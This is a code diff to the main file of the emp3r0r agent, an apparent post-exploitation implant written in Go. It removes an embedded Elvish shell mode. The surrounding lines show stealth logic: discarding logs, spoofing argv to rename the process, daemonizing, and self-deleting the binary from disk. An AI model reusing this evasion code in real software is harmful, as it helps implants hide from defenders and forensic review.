@@ -24,10 +24,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 	"github.com/ncruces/go-dns"
-	"src.elv.sh/pkg/buildinfo"
-	"src.elv.sh/pkg/lsp"
-	"src.elv.sh/pkg/prog"
-	"src.elv.sh/pkg/shell"
 )
 
 func main() {
@@ -42,8 +38,6 @@ func main() {
 	// accept env vars
 	verbose := os.Getenv("VERBOSE") == "true"
 	replace_agent = os.Getenv("REPLACE_AGENT") == "true"
-	// run as elvish shell
-	runElvish := os.Getenv("ELVISH") == "true"
 	// self delete or not
 	persistent := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
@@ -60,7 +54,7 @@ func main() {
 		defer f.Close()
 		log.SetOutput(f)
 		log.Println("emp3r0r agent has started")
-	} else if !runElvish {
+	} else {
 		// silent!
 		log.SetOutput(io.Discard)
 		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
@@ -73,7 +67,7 @@ func main() {
 	}
 
 	// do not tamper with argv or re-launch under these conditions
-	do_not_touch_argv := runElvish || run_from_loader || run_from_guardian_shellcode
+	do_not_touch_argv := run_from_loader || run_from_guardian_shellcode
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
@@ -97,11 +91,9 @@ func main() {
 	}
 
 	// always daemonize unless verbose is specified
-	run_as_daemon := !verbose &&
+	run_as_daemon := runtime.GOOS == "linux" && !verbose &&
 		// don't daemonize if we're already daemonized
 		os.Getenv("DAEMON") != "true" &&
-		// do not daemonize if run as elvish
-		!runElvish &&
 		// do not daemonize if run from loader.so
 		!run_from_loader
 	if run_as_daemon {
@@ -114,7 +106,6 @@ func main() {
 		os.Exit(0)
 	}
 
-	osArgs := os.Args
 	self_path, err := os.Readlink("/proc/self/exe")
 	if !persistent && !do_not_touch_argv {
 		// rename our agent process to make it less suspecious
@@ -126,17 +117,8 @@ func main() {
 			util.RandInt(0, 6)))
 	}
 
-	// run as elvish shell
-	if runElvish {
-		os.Exit(prog.Run(
-			[3]*os.File{os.Stdin, os.Stdout, os.Stderr}, osArgs,
-			prog.Composite(
-				&buildinfo.Program{}, &lsp.Program{},
-				&shell.Program{})))
-	}
-
 	// self delete
-	if !persistent && !run_from_guardian_shellcode {
+	if !persistent && !run_from_guardian_shellcode && !run_from_loader {
 		err = os.Remove(self_path)
 		if err != nil {
 			log.Printf("Error removing agent file from disk: %v", err)
@@ -216,7 +198,6 @@ func main() {
 		}
 	}
 
-	// if the agent's process name is not "emp3r0r"
 test_agent:
 	alive, pid := agent.IsAgentRunningPID()
 	if alive {
